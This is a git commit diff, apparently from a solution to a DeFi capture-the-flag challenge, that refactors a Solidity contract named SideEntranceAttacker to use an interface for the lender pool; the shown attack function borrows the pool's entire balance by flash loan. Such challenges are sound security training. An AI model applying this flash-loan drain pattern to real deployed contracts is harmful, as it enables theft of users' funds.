af69906a8dc27390a201e821365fb93208e0073e
yuichiroaoki <yuichiroaoki27@gmail.com>
2021-09-25 19:32:36 +0900

    change interface

--- contracts/side-entrance/SideEntranceAttacker.sol
+++ contracts/side-entrance/SideEntranceAttacker.sol
@@ -2,15 +2,19 @@
 pragma solidity ^0.6.0;
 
 import "@openzeppelin/contracts/utils/Address.sol";
-import "./SideEntranceLenderPool.sol";
 
+interface ISideEntranceLenderPool {
+    function deposit() external payable;
+    function withdraw() external;
+    function flashLoan(uint256 amount) external;
+}
 
 contract SideEntranceAttacker {
     using Address for address payable;
 
-    SideEntranceLenderPool lender;
+    ISideEntranceLenderPool lender;
 
-    function attack(SideEntranceLenderPool _lender) external {
+    function attack(ISideEntranceLenderPool _lender) external {
         lender = _lender;
         uint256 amount = address(lender).balance;
         lender.flashLoan(amount);
